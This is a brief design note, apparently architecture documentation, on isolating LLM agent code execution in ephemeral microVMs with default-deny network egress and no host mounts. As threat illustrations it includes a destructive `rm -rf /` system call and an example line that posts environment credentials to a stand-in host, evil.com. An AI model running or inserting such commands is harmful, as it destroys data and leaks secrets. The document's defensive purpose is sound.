# Sandboxed Execution & Tool Security Perimeters

## 1. The Hazard of Direct Execution

Allowing an LLM or autonomous agent to execute dynamic code (e.g., Python scripts to analyze data or generate charts) on a production host node is a lethal architectural vulnerability. An injection attack can execute arbitrary shell commands (`os.system('rm -rf /')`) or exfiltrate environment credentials.

Dynamic code tools must execute within **ephemeral, isolated sandboxes**:

```mermaid
flowchart TD
    LLM["Model Emits Code:\n`import requests; requests.post('evil.com', data=env)`"] --> ToolWorker["Tool Execution Gateway"]
    
    ToolWorker --> SandboxManager["Spin Up Ephemeral MicroVM\n(AWS Firecracker / gVisor)"]
    
    subgraph MicroVM ["Isolated MicroVM Container (Lifecycle: 5 seconds)"]
        Exec["Execute Code in Sandboxed Python Runtime"]
        NetRules["iptables: Default Deny All Egress\n(No Internet Access / No Host Access)"]
        CPUQuota["cgroups: 0.5 vCPU / 256MB RAM Max"]
        Exec -.-> NetRules
    end

    SandboxManager --> MicroVM
    MicroVM --> ReturnResult["Return Output / Error to Gateway"]
    ReturnResult --> Destroy["Destroy MicroVM Instantly"]
```

---

## 2. Defense-in-Depth for Tools
* **Zero Host Mounts**: Sandboxes must never mount host file systems or docker sockets.
* **Network Egress Denial**: Block all outbound internet access by default. If a tool requires external API access, route traffic through a strict forward proxy with an allowlist of approved enterprise endpoints.
